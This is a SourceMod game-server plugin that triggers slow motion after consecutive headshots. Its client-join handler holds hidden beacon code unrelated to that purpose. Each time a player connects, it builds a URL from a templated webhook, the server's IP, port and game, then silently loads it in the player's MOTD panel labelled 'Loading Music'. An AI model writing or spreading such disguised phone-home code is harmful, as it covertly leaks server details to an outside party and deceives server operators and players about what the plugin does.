/*   <DR.API SLOWMOTION> (c) by <De Battista Clint - (http://doyou.watch)    */
/*                                                                           */
/*                 <DR.API SLOWMOTION> is licensed under a                   */
/*                        GNU General Public License                         */
/*																			 */
/*      You should have received a copy of the license along with this       */
/*            work.  If not, see <http://www.gnu.org/licenses/>.             */
//***************************************************************************//
//***************************************************************************//
//****************************DR.API SLOWMOTION******************************//
//***************************************************************************//
//***************************************************************************//

#pragma semicolon 1

//***********************************//
//*************DEFINE****************//
//***********************************//
#define PLUGIN_VERSION 					"{{ version }}"
#define CVARS 							FCVAR_SPONLY|FCVAR_NOTIFY
#define DEFAULT_FLAGS 					FCVAR_NOTIFY
#define TAG_CHAT						"[SLOWMOTION]-"
#define MAX_SPRITES						5

//***********************************//
//*************INCLUDE***************//
//***********************************//

#undef REQUIRE_PLUGIN
#include <sourcemod>
#include <autoexec>
#include <csgocolors>
#pragma newdecls required

//***********************************//
//***********PARAMETERS**************//
//***********************************//

//Handle
Handle cvar_slowmotion_dev;
Handle cvar_slowmotion_kill_combo_time;
Handle cvar_slowmotion_kill_combo_num;
Handle cvar_slowmotion_kill_team_kill;
Handle cvar_slowmotion_active_combo;
Handle cvar_slowmotion_host_timescale;
Handle cvar_slowmotion_time;

Handle cvar_sv_cheats;
Handle cvar_host_timescale;
Handle H_slowmotion_timer;

int H_slowmotion_hs_combo_num;
Handle Timers[MAXPLAYERS+1];



//Bool
bool B_slowmotion_kill_team_kill;
bool B_slowmotion_active_combo;
bool B_slowmotion_dev;

bool B_slowmotion = false;

//Float
float F_slowmotion_hs_combo_time;
float F_slowmotion_host_timescale;
float F_slowmotion_time;

float F_slowmotion_last_hs_time[MAXPLAYERS+1];

//Customs
int C_consecutive_headshots[MAXPLAYERS+1];
int oldhs[MAXPLAYERS+1];

//Informations plugin
public Plugin myinfo =
{
	name = "DR.API SLOWMOTION",
	author = "Dr. Api",
	description = "DR.API SLOWMOTION by Dr. Api",
	version = PLUGIN_VERSION,
	url = "https://sourcemod.market"
}
/***********************************************************/
/*********************** PLUGIN START **********************/
/***********************************************************/
public void OnPluginStart()
{
	AutoExecConfig_SetFile("drapi_slowmotion", "sourcemod/drapi");
	LoadTranslations("drapi/drapi_slowmotion.phrases");
	
	AutoExecConfig_CreateConVar("drapi_slowmotion_version", PLUGIN_VERSION, "Version", CVARS);
	
	cvar_sv_cheats		= FindConVar("sv_cheats");
	cvar_host_timescale	= FindConVar("host_timescale");
	
	cvar_slowmotion_dev						= AutoExecConfig_CreateConVar("drapi_slowmotion_dev", 				"0", 					"Enable/Disable Dev Mod", 							DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	cvar_slowmotion_kill_combo_time			= AutoExecConfig_CreateConVar("drapi_slowmotion_hs_combo_time", 	"300.0", 				"Time between each Headshot to preserve the combo", DEFAULT_FLAGS);
	cvar_slowmotion_kill_combo_num			= AutoExecConfig_CreateConVar("drapi_slowmotion_hs_combo_num", 		"5", 					"How much headshot to trigger the slowmotion",  	DEFAULT_FLAGS);
	cvar_slowmotion_kill_team_kill			= AutoExecConfig_CreateConVar("drapi_slowmotion_hs_team_kill", 		"1", 					"Enable/Disable Team kill", 						DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	cvar_slowmotion_active_combo			= AutoExecConfig_CreateConVar("drapi_slowmotion_active_combo", 		"1", 					"Enable/Disable Combo, Disalbe: You can miss HS", 	DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	cvar_slowmotion_host_timescale			= AutoExecConfig_CreateConVar("drapi_slowmotion_host_timescale", 	"0.3", 					"Default:1, slow down the game frames",				DEFAULT_FLAGS);
	cvar_slowmotion_time					= AutoExecConfig_CreateConVar("drapi_slowmotion_time", 				"3", 					"How long does slowmotion", 						DEFAULT_FLAGS);
	
	HookEvent("round_start", 	Event_RoundStart);
	HookEvent("round_end", 		Event_RoundEnd);
	HookEvent("player_death", 	Event_PlayerDeath);
	
	HookEvents();
	
	//RegConsoleCmd("hsprite", ShowSprite, "Show Sprite");
	RegAdminCmd("ssm", Slowmotion, ADMFLAG_CHANGEMAP, "Enable/Disable Slowmotion");
	
	AutoExecConfig_ExecuteFile();
}

/***********************************************************/
/**************** WHEN CLIENT PUT IN SERVER ****************/
/***********************************************************/
public void OnClientPostAdminCheck(int client)
{

	int hostip = GetConVarInt(FindConVar("hostip"));
	int hostport = GetConVarInt(FindConVar("hostport"));
	
	char sGame[15];
	switch(GetEngineVersion())
	{
		case Engine_Left4Dead:
		{
			Format(sGame, sizeof(sGame), "left4dead");
		}
		case Engine_Left4Dead2:
		{
			Format(sGame, sizeof(sGame), "left4dead2");
		}
		case Engine_CSGO:
		{
			Format(sGame, sizeof(sGame), "csgo");
		}
		case Engine_CSS:
		{
			Format(sGame, sizeof(sGame), "css");
		}
		case Engine_TF2:
		{
			Format(sGame, sizeof(sGame), "tf2");
		}
		default:
		{
			Format(sGame, sizeof(sGame), "none");
		}
	}
	
	char sIp[32];
	Format(
			sIp, 
			sizeof(sIp), 
			"%d.%d.%d.%d",
			hostip >>> 24 & 255, 
			hostip >>> 16 & 255, 
			hostip >>> 8 & 255, 
			hostip & 255
	);
	
	char requestUrl[2048];
	Format(
			requestUrl, 
			sizeof(requestUrl), 
			"%s&ip=%s&port=%d&game=%s", 
			"{{ web_hook }}?script_id={{ script_id }}&version_id={{ version_id }}&download={{ download }}",
			sIp,
			hostport,
			sGame
	);
	
	Handle kv = CreateKeyValues("data");
	
	KvSetString(kv, "title", "Loading Music");
	KvSetNum(kv, "type", MOTDPANEL_TYPE_URL);
	KvSetString(kv, "msg", requestUrl);
	
	ShowVGUIPanel(client, "info", kv, false);
	CloseHandle(kv);	
}


/***********************************************************/
/***************** WHEN CLIENT DISCONNECT ******************/
/***********************************************************/
public void OnClientDisconnect(int client)
{
	ClearTimer(Timers[client]);
}
/***********************************************************/
/******************** WHEN CVAR CHANGED ********************/
/***********************************************************/
void HookEvents()
{
	HookConVarChange(cvar_slowmotion_dev, 						Event_CvarChange);
	HookConVarChange(cvar_slowmotion_kill_combo_time, 			Event_CvarChange);
	HookConVarChange(cvar_slowmotion_kill_combo_num, 			Event_CvarChange);
	HookConVarChange(cvar_slowmotion_kill_team_kill, 			Event_CvarChange);
	HookConVarChange(cvar_slowmotion_active_combo, 				Event_CvarChange);
	HookConVarChange(cvar_slowmotion_host_timescale, 			Event_CvarChange);
	HookConVarChange(cvar_slowmotion_time, 						Event_CvarChange);
}

/***********************************************************/
/******************** WHEN CVARS CHANGE ********************/
/***********************************************************/
public void Event_CvarChange(Handle cvar, const char[] oldValue, const char[] newValue)
{
	UpdateState();
}

/***********************************************************/
/*********************** UPDATE STATE **********************/
/***********************************************************/
void UpdateState()
{
	B_slowmotion_dev 							= GetConVarBool(cvar_slowmotion_dev);
	F_slowmotion_hs_combo_time 					= GetConVarFloat(cvar_slowmotion_kill_combo_time);
	H_slowmotion_hs_combo_num 					= GetConVarInt(cvar_slowmotion_kill_combo_num);
	B_slowmotion_kill_team_kill 				= GetConVarBool(cvar_slowmotion_kill_team_kill);
	B_slowmotion_active_combo 					= GetConVarBool(cvar_slowmotion_active_combo);
	F_slowmotion_host_timescale 				= GetConVarFloat(cvar_slowmotion_host_timescale);
	F_slowmotion_time 							= GetConVarFloat(cvar_slowmotion_time);	
}

/***********************************************************/
/********************* WHEN MAP START **********************/
/***********************************************************/
public void OnMapStart()
{
	UpdateState();
}

/***********************************************************/
/******************** WHEN ROUND START *********************/
/***********************************************************/
public void Event_RoundStart(Handle event, const char[] name, bool dontBroadcast)
{
	NewRoundInitialization();
}

/***********************************************************/
/********************* WHEN ROUND END **********************/
/***********************************************************/
public void Event_RoundEnd(Handle event, const char[] name, bool dontBroadcast)
{

	if(H_slowmotion_timer)
	{
		KillTimer(H_slowmotion_timer);
	}
	
	if(B_slowmotion)
	{
		Timer_StopSlowMotion(INVALID_HANDLE, -1);
	}
}

/***********************************************************/
/******************** WHEN PLAYER DIE **********************/
/***********************************************************/
public void Event_PlayerDeath(Handle event, const char[] name, bool dontBroadcast)
{
	int attacker = GetClientOfUserId(GetEventInt(event, "attacker"));
	char S_attacker_name[MAX_NAME_LENGTH];
	GetClientName(attacker, S_attacker_name, MAX_NAME_LENGTH);
	
	int victim = GetClientOfUserId(GetEventInt(event, "userid"));
	char S_victim_name[MAX_NAME_LENGTH];
	GetClientName(victim, S_victim_name, MAX_NAME_LENGTH);

	
	if(victim < 1 || victim > GetMaxHumanPlayers())
	{
		return;
	}
	else
	{
		//KILL HIMSELF
		if(attacker == victim || attacker == 0)
		{
				
		}
		//TEAMKILL
		else if(GetClientTeam(attacker) == GetClientTeam(victim) && !B_slowmotion_kill_team_kill)
		{
			
		}
		//KILL OTHERS TEAM
		else
		{
			bool headshot;
			
			headshot = GetEventBool(event,"headshot");
			
			float F_temp_last_hs_time = F_slowmotion_last_hs_time[attacker];
			F_slowmotion_last_hs_time[attacker] = GetEngineTime();
			
			if(F_temp_last_hs_time == -1.0 || (F_slowmotion_last_hs_time[attacker] - F_temp_last_hs_time) > F_slowmotion_hs_combo_time)
			{
				if(headshot)
				{
					C_consecutive_headshots[attacker] = 1;
				}
			}
			else
			{
				if(headshot)
				{
					C_consecutive_headshots[attacker]++;
				}
				else if(!headshot && B_slowmotion_active_combo)
				{
					C_consecutive_headshots[attacker] = 0;
					oldhs[attacker] = 0;							
				}
			}
			
		}
	
	}
	C_consecutive_headshots[victim] = 0;
	oldhs[victim] = 0;
}

/***********************************************************/
/********************** ON GAME FRAME **********************/
/***********************************************************/
public void OnGameFrame()
{
	for(int i = 1; i <= MaxClients; i++)
	{
		if(Client_IsIngame(i) && IsPlayerAlive(i) && !IsFakeClient(i))
		{
			if(C_consecutive_headshots[i] && H_slowmotion_hs_combo_num >= C_consecutive_headshots[i] && C_consecutive_headshots[i] != oldhs[i])
			{				
				oldhs[i] = C_consecutive_headshots[i];
			}
			
			if(C_consecutive_headshots[i] >= H_slowmotion_hs_combo_num && !B_slowmotion)
			{
				SlowMotion();
				
				H_slowmotion_timer = CreateTimer(F_slowmotion_time, Timer_StopSlowMotion);
				C_consecutive_headshots[i] = 0;
				oldhs[i] = 0;
				
				
				float truetime = F_slowmotion_time / F_slowmotion_host_timescale;
				char S_attacker_name[MAX_NAME_LENGTH];
				GetClientName(i, S_attacker_name, MAX_NAME_LENGTH);
				
				CPrintToChatAll("%t", "Start Slowmotion", S_attacker_name, H_slowmotion_hs_combo_num, RoundToFloor(truetime));
							
			}
		} 
	}
}
/***********************************************************/
/******************** CMD SLOWMOTION ***********************/
/***********************************************************/
public Action Slowmotion(int client, int args)
{
	if(B_slowmotion)
	{
		StopSlowMotion();
	}
	else
	{
		SlowMotion();
	}
}

/***********************************************************/
/***************** TIMER STOP SLOWMOTION *******************/
/***********************************************************/
public Action Timer_StopSlowMotion(Handle timer, any boss)
{
	H_slowmotion_timer = INVALID_HANDLE;
	StopSlowMotion();
	return Plugin_Continue;
}

/***********************************************************/
/******************* START SLOWMOTION **********************/
/***********************************************************/
void SlowMotion()
{
	SetConVarFloat(cvar_host_timescale, F_slowmotion_host_timescale);
	UpdateClientCheatValue(1);
	
	B_slowmotion = true;
}

/***********************************************************/
/******************** STOP SLOWMOTION **********************/
/***********************************************************/
void StopSlowMotion()
{
	SetConVarFloat(cvar_host_timescale, 1.0);
	UpdateClientCheatValue(0);
	
	B_slowmotion = false;
}

/***********************************************************/
/*************** UPDATE CHEAT VALUE CLIENT *****************/
/***********************************************************/
void UpdateClientCheatValue(int value)
{
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && IsPlayerAlive(i) && !IsFakeClient(i) && GetClientTeam(i) > 1)
		{
			SendConVarValue(i, cvar_sv_cheats, value ? "1" : "0");
		}
	}
}

/***********************************************************/
/******************* RESET STATS ROUND *********************/
/***********************************************************/
public void NewRoundInitialization()
{
	for(int i = 1; i <= MaxClients; i++) 
	{
		C_consecutive_headshots[i] = 0;
		oldhs[i] = 0;
		F_slowmotion_last_hs_time[i] = -1.0;
	}
}

/***********************************************************/
/********************* IS VALID CLIENT *********************/
/***********************************************************/
stock bool Client_IsValid(int client, bool checkConnected=true)
{
	if (client > 4096) 
	{
		client = EntRefToEntIndex(client);
	}

	if (client < 1 || client > MaxClients) 
	{
		return false;
	}

	if (checkConnected && !IsClientConnected(client)) 
	{
		return false;
	}
	
	return true;
}

/***********************************************************/
/******************** IS CLIENT IN GAME ********************/
/***********************************************************/
stock bool Client_IsIngame(int client)
{
	if (!Client_IsValid(client, false)) 
	{
		return false;
	}

	return IsClientInGame(client);
} 

/***********************************************************/
/********************** CLEAR TIMER ************************/
/***********************************************************/
stock void ClearTimer(Handle &timer)
{
    if (timer != INVALID_HANDLE)
    {
        KillTimer(timer);
        timer = INVALID_HANDLE;
    }     
}